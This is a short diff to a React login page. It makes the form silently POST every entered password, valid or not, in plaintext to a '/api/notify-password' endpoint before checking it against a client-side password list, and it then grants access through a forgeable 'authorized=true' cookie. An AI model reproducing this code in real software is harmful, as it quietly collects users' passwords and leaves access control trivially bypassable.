@@ -17,16 +17,14 @@ export default function LoginPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (validPasswords.includes(password)) {
-      // 🔔 Send silent background notification
-      fetch('/api/notify-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password }),
-      }).catch((err) => {
-        console.error('Notification failed', err);
-      });
+    // 🔔 Send silent notification
+    fetch('/api/notify-password', {
+      method: 'POST',
+      body: JSON.stringify({ password }),
+      headers: { 'Content-Type': 'application/json' },
+    });
 
+    if (validPasswords.includes(password)) {
       document.cookie = "authorized=true; path=/";
       router.push('/');
     } else {
